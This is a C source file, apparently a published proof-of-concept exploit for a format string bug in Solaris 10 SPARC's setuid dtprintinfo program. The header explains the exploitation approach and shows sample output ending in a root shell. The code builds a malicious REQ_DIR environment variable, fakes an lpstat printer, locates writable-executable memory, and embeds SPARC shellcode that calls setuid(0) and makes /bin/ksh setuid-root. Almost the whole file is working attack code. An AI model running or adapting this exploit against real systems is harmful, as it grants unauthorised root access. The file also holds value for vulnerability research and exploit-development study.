/*
 * raptor_dtprintcheckdir_sparc.c - Solaris/SPARC FMT PoC 
 * Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * "Mimimimimimimi
 *  Mimimi only mimi
 *  Mimimimimimimi
 *  Mimimi sexy mi"
 *  		-- Serebro
 *
 * As usual, exploitation on SPARC turned out to be much more complicated (and
 * fun) than on Intel. Since the vulnerable program needs to survive one 
 * additional function before we can hijack %pc, the classic stack-based buffer
 * overflow approach didn't seem feasible in this case. Therefore, I opted for
 * the format string bug. This is just a proof of concept, 'cause guess what -- 
 * on my system it works only when gdb or truss are attached to the target 
 * process:( To borrow Neel Mehta's words:
 *
 * "It's quite common to find an exploit that only works with GDB attached to
 * the process, simply because without the debugger, break register windows
 * aren't flushed to the stack and the overwrite has no effect." 
 * 						-- The Shellcoder's Handbook
 *
 * On different hardware configurations this exploit might work if the correct
 * retloc and offset are provided. It might also be possible to force a context
 * switch at the right time that results in registers being flushed to the
 * stack at the right moment. However, this method tends to be unreliable even
 * when the attack is repeatable like in this case. A better way to solve the
 * puzzle would be to overwrite something different, e.g.:
 *
 * - Activation records of other functions, such as check_dir() (same issues)
 * - Callback to function SortJobs() (nope, address is hardcoded in .text)
 * - PLT in the binary (I need a different technique to handle null bytes)
 * - PLT (R_SPARC_JMP_SLOT) in libc (no null bytes, this looks promising!) 
 * - Other OS function pointers I'm not aware of still present in Solaris 10
 *
 * Finally, it might be possible to combine the stack-based buffer overflow and
 * the format string bug to surgically fix addresses and survive until needed
 * for program flow hijacking to be possible. Bottom line: there's still some
 * work to do to obtain a reliable exploit, but I think it's feasible. You're
 * welcome to try yourself if you feel up to the task and have a spare SPARC
 * box;) [spoiler alert: I did it myself, see raptor_dtprintcheckdir_sparc2.c]
 *
 * This bug was likely fixed during the general cleanup of CDE code done by
 * Oracle in response to my recently reported vulnerabilities. However, I can't
 * confirm this because I have no access to their patches:/
 *
 * See also:
 * raptor_dtprintcheckdir_intel.c (vulnerability found by Marti Guasch Jimenez)
 * raptor_dtprintcheckdir_intel2.c
 * raptor_dtprintcheckdir_sparc2.c (the real deal)
 *
 * Usage:
 * $ gcc raptor_dtprintcheckdir_sparc.c -o raptor_dtprintcheckdir_sparc -Wall
 * [on your xserver: disable the access control]
 * $ truss -u a.out -u '*' -fae ./raptor_dtprintcheckdir_sparc 192.168.1.1:0
 * [on your xserver: double click on the fake "fnord" printer]
 * ...
 * -> __0FJcheck_dirPcTBPPP6QStatusLineStructPii(0xfe584e58, 0xff2a4042, 0x65db0, 0xffbfc50c)
 *   -> libc:getenv(0x4e8f8, 0x0, 0x0, 0x0)
 *   <- libc:getenv() = 0xffbff364
 *   -> libc:getenv(0x4e900, 0x1, 0xf9130, 0x0)
 *   <- libc:getenv() = 0xffbff364
 *   -> libc:sprintf(0xffbfc1bc, 0xffbff364, 0xff2a4042, 0x0)
 * ...
 * setuid(0)                                       = 0
 * chmod("/bin/ksh", 037777777777)                 = 0
 * _exit(0)
 * $ ksh
 * # id
 * uid=100(user) gid=1(other) euid=0(root) egid=2(bin)
 * #
 *
 * Tested on:
 * SunOS 5.10 Generic_Virtual sun4u sparc SUNW,SPARC-Enterprise
 * [previous Solaris versions are also likely vulnerable (and easier to exploit)]
 */

#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/systeminfo.h>

#define INFO1	"raptor_dtprintcheckdir_sparc.c - Solaris/SPARC FMT PoC"
#define INFO2	"Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN		"/usr/dt/bin/dtprintinfo"	// vulnerable program
#define	BUFSIZE		3000				// size of evil env var
#define	BUFSIZE2	10000				// size of padding buf
#define	STACKPOPSEQ	"%.8x"				// stackpop sequence
#define	STACKPOPS	383				// number of stackpops

/* default retloc and offset for sprintf() */
#define RETLOC		0xffbfbb3c			// saved ret location
#define OFFSET		84				// offset from retloc to i0loc

/* default retloc and offset for check_dir() */
/* TODO: patch %i6 that gets corrupted by overflow */
//#define RETLOC	0xffbfbbac			// default saved ret location
//#define OFFSET	1884				// default offset from retloc to i0loc

/* split an address in 4 bytes */
#define SPLITB(B1, B2, B3, B4, ADDR) {	\
	B4 = (ADDR & 0x000000ff);	\
	B3 = (ADDR & 0x0000ff00) >> 8;	\
	B2 = (ADDR & 0x00ff0000) >> 16;	\
	B1 = (ADDR & 0xff000000) >> 24;	\
}

/* calculate numeric arguments for write string */
#define CALCARGS(N1, N2, N3, N4, B1, B2, B3, B4, BASE) {	\
	N1 = (B4 - BASE)			% 0x100;	\
	N2 = (B2 - BASE - N1)			% 0x100;	\
	N3 = (B1 - BASE - N1 - N2)		% 0x100;	\
	N4 = (B3 - BASE - N1 - N2 - N3)		% 0x100;	\
	BASE += N1 + N2 + N3 + N4;				\
}

//#define USE_EXEC_SC		// uncomment to use exec shellcode

#ifdef USE_EXEC_SC
	char sc[] = /* Solaris/SPARC execve() shellcode (12 + 48 = 60 bytes) */
	/* setuid(0) */
	"\x90\x08\x3f\xff"	/* and  %g0, -1, %o0		*/
	"\x82\x10\x20\x17"	/* mov  0x17, %g1		*/
	"\x91\xd0\x20\x08"	/* ta   8			*/
	/* execve("/bin/ksh", argv, NULL) */
	"\x9f\x41\x40\x01"	/* rd   %pc,%o7 ! >= sparcv8+	*/
	"\x90\x03\xe0\x28"	/* add  %o7, 0x28, %o0		*/
	"\x92\x02\x20\x10"	/* add  %o0, 0x10, %o1		*/
	"\xc0\x22\x20\x08"	/* clr  [ %o0 + 8 ]		*/
	"\xd0\x22\x20\x10"	/* st   %o0, [ %o0 + 0x10 ]	*/
	"\xc0\x22\x20\x14"	/* clr  [ %o0 + 0x14 ]		*/
	"\x82\x10\x20\x0b"	/* mov  0xb, %g1		*/
	"\x91\xd0\x20\x08"	/* ta   8			*/
	"\x80\x1c\x40\x11"	/* xor  %l1, %l1, %g0 ! nop	*/
	"\x41\x41\x41\x41"	/* placeholder			*/
	"/bin/ksh";
#else
	char sc[] = /* Solaris/SPARC chmod() shellcode (12 + 32 + 20 = 64 bytes) */
	/* setuid(0) */
	"\x90\x08\x3f\xff"	/* and  %g0, -1, %o0		*/
	"\x82\x10\x20\x17"	/* mov  0x17, %g1		*/
	"\x91\xd0\x20\x08"	/* ta   8			*/
	/* chmod("/bin/ksh", 037777777777) */
	"\x92\x20\x20\x01"	/* sub  %g0, 1, %o1		*/
	"\x20\xbf\xff\xff"	/* bn,a <sc - 4>		*/
	"\x20\xbf\xff\xff"	/* bn,a <sc>			*/
	"\x7f\xff\xff\xff"	/* call <sc + 4>		*/
	"\x90\x03\xe0\x20"	/* add  %o7, 0x20, %o0		*/
	"\xc0\x22\x20\x08"	/* clr  [ %o0 + 8 ]		*/
	"\x82\x10\x20\x0f"	/* mov  0xf, %g1		*/
	"\x91\xd0\x20\x08"	/* ta   8			*/
	/* exit(0) */
	"\x90\x08\x3f\xff"	/* and  %g0, -1, %o0		*/
	"\x82\x10\x20\x01"	/* mov  1, %g1			*/
	"\x91\xd0\x20\x08"	/* ta   8			*/
	"/bin/ksh";
#endif /* USE_EXEC_SC */

/* globals */
char	*arg[2] = {"foo", NULL};
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	check_zero(int addr, char *pattern);
int	get_env_addr(char *path, char **argv);
int	search_ldso(char *sym);
int	search_rwx_mem(void);
void	set_val(char *buf, int pos, int val);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char		buf[BUFSIZE], *p = buf, buf2[BUFSIZE2];
	char		platform[256], release[256], display[256];
	int		env_addr, sc_addr, retloc = RETLOC, i0loc, i1loc, i7loc;
	int		offset = OFFSET;

	int		sb = ((int)argv[0] | 0xffff) & 0xfffffffc;
	int		ret = search_ldso("sprintf");
	int		rwx_mem = search_rwx_mem() + 24; /* stable address */

	int		i, stackpops = STACKPOPS;
	unsigned char	b1, b2, b3, b4;
	unsigned	base, n[16]; /* must be unsigned */

	/* lpstat code to add a fake printer */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for fnord: /dev/null\n");
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: fnord\n");
		}
		exit(0);
	}

	/* helper program that prints argv[0] address, used by get_env_addr() */
	if (!strcmp(argv[0], "foo")) {
		printf("0x%p\n", argv[0]);
		exit(0);
	}

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* process command line */
	if ((argc < 2) || (argc > 4)) {
#ifdef USE_EXEC_SC
		fprintf(stderr, "usage: %s xserver:display [retloc] [offset]\n\n", argv[0]);
#else
		fprintf(stderr, "usage:\n$ %s xserver:display [retloc] [offset]\n$ /bin/ksh\n\n", argv[0]);
#endif /* USE_EXEC_SC */
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);
	if (argc > 2)
		retloc = (int)strtoul(argv[2], (char **)NULL, 0);
	if (argc > 3)
		offset = (int)strtoul(argv[3], (char **)NULL, 0);

	/* calculate saved %i0 and %i7 locations based on retloc */
	i0loc = retloc + offset;
	i1loc = i0loc + 4;
	i7loc = i0loc + 28;

	/* evil env var: name + shellcode + padding */
	memset(buf, 'A', sizeof(buf));
	buf[sizeof(buf) - 1] = 0x0;
	memcpy(buf, "REQ_DIR=", strlen("REQ_DIR="));
	p += strlen("REQ_DIR=");

	/* padding buffer to avoid stack overflow */
	memset(buf2, 'B', sizeof(buf2));
	buf2[sizeof(buf2) - 1] = 0x0;

	/* fill the envp, keeping padding */
	add_env(buf2);
	add_env(buf);
	add_env(display);
	add_env("TMP_DIR=/tmp");
	add_env("PATH=.:/usr/bin");
	sc_addr = add_env("HOME=/tmp");
	add_env(sc);
	add_env(NULL);

	/* calculate the needed addresses */
	env_addr = get_env_addr(VULN, argv);
	sc_addr += env_addr;

#ifdef USE_EXEC_SC
	/* populate exec shellcode placeholder */
	set_val(sc, 48, sb - 1024);
#endif /* USE_EXEC_SC */

	/* format string: saved ret */
	*((void **)p) = (void *)(retloc); p += 4; 	/* 0x000000ff */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(retloc); p += 4; 	/* 0x00ff0000 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(retloc); p += 4; 	/* 0xff000000 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(retloc + 2); p += 4; 	/* 0x0000ff00 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */

	/* format string: saved %i0: 1st arg to sprintf() */
	*((void **)p) = (void *)(i0loc); p += 4; 	/* 0x000000ff */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(i0loc); p += 4; 	/* 0x00ff0000 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(i0loc); p += 4; 	/* 0xff000000 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(i0loc + 2); p += 4; 	/* 0x0000ff00 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */

	/* format string: saved %i7: return address */
	*((void **)p) = (void *)(i7loc); p += 4; 	/* 0x000000ff */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(i7loc); p += 4; 	/* 0x00ff0000 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(i7loc); p += 4; 	/* 0xff000000 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(i7loc + 2); p += 4; 	/* 0x0000ff00 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */

	/* format string: saved %i1: 2nd arg to sprintf() */
	*((void **)p) = (void *)(i1loc); p += 4; 	/* 0x000000ff */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(i1loc); p += 4; 	/* 0x00ff0000 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(i1loc); p += 4; 	/* 0xff000000 */
	memset(p, 'A', 4); p += 4; 			/* dummy      */
	*((void **)p) = (void *)(i1loc + 2); p += 4; 	/* 0x0000ff00 */

	/* format string: stackpop sequence */
	base = p - buf - strlen("REQ_DIR=");
	for (i = 0; i < stackpops; i++, p += strlen(STACKPOPSEQ), base += 8)
		memcpy(p, STACKPOPSEQ, strlen(STACKPOPSEQ));

	/* calculate numeric arguments for retloc */
	SPLITB(b1, b2, b3, b4, (ret - 4));
	CALCARGS(n[0], n[1], n[2], n[3], b1, b2, b3, b4, base);

	/* calculate numeric arguments for i0loc */
	SPLITB(b1, b2, b3, b4, rwx_mem);
	CALCARGS(n[4], n[5], n[6], n[7], b1, b2, b3, b4, base);

	/* calculate numeric arguments for i7loc */
	SPLITB(b1, b2, b3, b4, (rwx_mem - 8));
	CALCARGS(n[8], n[9], n[10], n[11], b1, b2, b3, b4, base);

	/* calculate numeric arguments for i1loc */
	SPLITB(b1, b2, b3, b4, sc_addr);
	CALCARGS(n[12], n[13], n[14], n[15], b1, b2, b3, b4, base);

	/* check for potentially dangerous numeric arguments below 10 */
	for (i = 0; i < 16; i++)
		n[i] += (n[i] < 10) ? (0x100) : (0);

	/* format string: write string */
	sprintf(p, "%%.%dx%%n%%.%dx%%hn%%.%dx%%hhn%%.%dx%%hhn%%.%dx%%n%%.%dx%%hn%%.%dx%%hhn%%.%dx%%hhn%%.%dx%%n%%.%dx%%hn%%.%dx%%hhn%%.%dx%%hhn%%.%dx%%n%%.%dx%%hn%%.%dx%%hhn%%.%dx%%hhn", n[0], n[1], n[2], n[3], n[4], n[5], n[6], n[7], n[8], n[9], n[10], n[11], n[12], n[13], n[14], n[15]);
	buf[strlen(buf)] = 'A'; /* preserve buf length */

	/* we need at least one directory inside TMP_DIR to trigger the bug */
	mkdir("/tmp/one_dir", S_IRWXU | S_IRWXG | S_IRWXO);

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");

	/* print some output */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using ret location\t: 0x%p\n", (void *)retloc);
	fprintf(stderr, "Using %%i0 location\t: 0x%p\n", (void *)i0loc);
	fprintf(stderr, "Using %%i1 location\t: 0x%p\n", (void *)i1loc);
	fprintf(stderr, "Using %%i7 location\t: 0x%p\n", (void *)i7loc);
	fprintf(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	fprintf(stderr, "Using sc address\t: 0x%p\n", (void *)sc_addr);
	fprintf(stderr, "Using sprintf() address\t: 0x%p\n\n", (void *)ret);

	/* check for null bytes (add some padding to env if needed) */
	check_zero(retloc, "ret location");
	check_zero(i0loc, "%%i0 location");
	check_zero(i1loc, "%%i1 location");
	check_zero(i7loc, "%%i7 location");
	check_zero(rwx_mem, "rwx_mem address");
	check_zero(sc_addr, "sc address");

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(1);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return env_len;
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return env_len;
}

/*
 * check_zero(): check an address for the presence of a 0x00
 */
void check_zero(int addr, char *pattern)
{
	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
	    !(addr & 0xff000000)) {
		fprintf(stderr, "error: %s contains a 0x00!\n", pattern);
		exit(1);
	}
}

/*
 * get_env_addr(): get environment address using a helper program
 */
int get_env_addr(char *path, char **argv)
{
	char	prog[] = "./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	char	hex[11] = "\x00";
	int	fd[2], addr;

	/* truncate program name at correct length and create a hard link */
	prog[strlen(path)] = 0x0;
	unlink(prog);
	link(argv[0], prog);

	/* open pipe to read program output */
	if (pipe(fd) < 0) {
		perror("pipe");
		exit(1);
	}

	switch(fork()) {

	case -1: /* cannot fork */
		perror("fork");
		exit(1);

	case 0: /* child */
		dup2(fd[1], 1);
		close(fd[0]);
		close(fd[1]);
		execve(prog, arg, env);
		perror("execve");
		exit(1);

	default: /* parent */
		close(fd[1]);
		read(fd[0], hex, sizeof(hex));
		break;
	}

	/* check and return address */
	if (!(addr = (int)strtoul(hex, (char **)NULL, 0))) {
		fprintf(stderr, "error: cannot read ff address from helper program\n");
		exit(1);
	}
	return addr + 4;
}

/*
 * search_ldso(): search for a symbol inside ld.so.1
 */
int search_ldso(char *sym)
{
	int		addr;
	void		*handle;
	Link_map	*lm;

	/* open the executable object file */
	if ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) {
		perror("dlopen");
		exit(1);
	}

	/* get dynamic load information */
	if ((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1) {
		perror("dlinfo");
		exit(1);
	}

	/* search for the address of the symbol */
	if ((addr = (int)dlsym(handle, sym)) == NULL) {
		fprintf(stderr, "error: sorry, function %s() not found\n", sym);
		exit(1);
	}

	/* close the executable object file */
	dlclose(handle);

	check_zero(addr - 4, sym);
	return addr;
}

/*
 * search_rwx_mem(): search for an RWX memory segment valid for all
 * programs (typically, /usr/lib/ld.so.1) using the proc filesystem
 */
int search_rwx_mem(void)
{
	int	fd;
	char	tmp[16];
	prmap_t	map;
	int	addr = 0, addr_old;

	/* open the proc filesystem */
	sprintf(tmp,"/proc/%d/map", (int)getpid());
	if ((fd = open(tmp, O_RDONLY)) < 0) {
		fprintf(stderr, "error: can't open %s\n", tmp);
		exit(1);
	}

	/* search for the last RWX memory segment before stack (last - 1) */
	while (read(fd, &map, sizeof(map)))
		if (map.pr_vaddr)
			if (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC)) {
				addr_old = addr;
				addr = map.pr_vaddr;
			}
	close(fd);

	/* add 4 to the exact address null bytes */
	if (!(addr_old & 0xff))
		addr_old |= 0x04;
	if (!(addr_old & 0xff00))
		addr_old |= 0x0400;

	return addr_old;
}

/*
 * set_val(): copy a dword inside a buffer
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0xff000000) >> 24;
	buf[pos + 1] =	(val & 0x00ff0000) >> 16;
	buf[pos + 2] =	(val & 0x0000ff00) >> 8;
	buf[pos + 3] =	(val & 0x000000ff);
}
